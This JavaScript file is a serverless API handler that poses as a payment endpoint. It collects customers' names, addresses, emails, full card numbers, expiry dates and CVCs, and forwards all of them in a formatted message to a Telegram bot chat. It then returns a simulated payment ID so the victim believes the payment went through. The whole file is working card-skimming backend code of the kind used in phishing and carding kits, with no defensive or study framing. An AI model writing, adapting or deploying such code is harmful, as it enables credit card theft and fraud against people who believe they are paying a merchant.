const axios = require('axios');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Replace with your Telegram Bot Token and Chat ID
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Extract payment data from the request
  const paymentData = {
    email: req.body.email,
    full_name: req.body.full_name,
    country: req.body.country,
    address: req.body.address,
    city: req.body.city,
    province: req.body.province,
    postal_code: req.body.postal_code,
    card_number: req.body.card_number,
    card_expiry: req.body.card_expiry,
    card_cvc: req.body.card_cvc,
    amount: req.body.amount,
    currency: req.body.currency,
  };

  // Format the message for Telegram
  const message = `
💳 *New Payment Received* 💳
--------------------------------
📧 *Email*: ${paymentData.email}
👤 *Name*: ${paymentData.full_name}
🌍 *Country*: ${paymentData.country}
🏠 *Address*: ${paymentData.address}
🏙️ *City*: ${paymentData.city}
📍 *Province*: ${paymentData.province}
📬 *Postal Code*: ${paymentData.postal_code}
💰 *Amount*: ${paymentData.currency} ${paymentData.amount}
💳 *Card Number*: \`${paymentData.card_number}\`
📅 *Expiry*: ${paymentData.card_expiry}
🔒 *CVC*: \`${paymentData.card_cvc}\`
--------------------------------
⚠️ *Warning: This is raw card data. Handle with care!*
  `;

  try {
    // Send to Telegram
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }
    );

    // Respond to the frontend
    res.status(200).json({
      ok: true,
      payment_id: Date.now(), // Simulate a payment ID
      message: 'Payment data received and sent to Telegram.',
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      ok: false,
      error: 'Failed to send data to Telegram.',
    });
  }
}